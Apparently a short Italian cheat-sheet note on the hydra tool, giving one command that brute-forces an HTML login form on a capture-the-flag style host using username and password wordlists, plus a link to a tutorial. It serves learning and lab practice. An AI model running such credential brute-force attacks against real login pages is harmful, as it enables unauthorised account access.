# hydra

## attacco a forza bruta di un form HTML

```
hydra app.tan.ctfio.com http-form-post "/:username=^USER^&password=^PASS^:Invalid" -L usernames.txt -P passwords.txt -t 5 -w 6
```

# link-o-grafia
- https://www.html.it/articoli/attacco-brute-force-di-un-form-con-hydra/
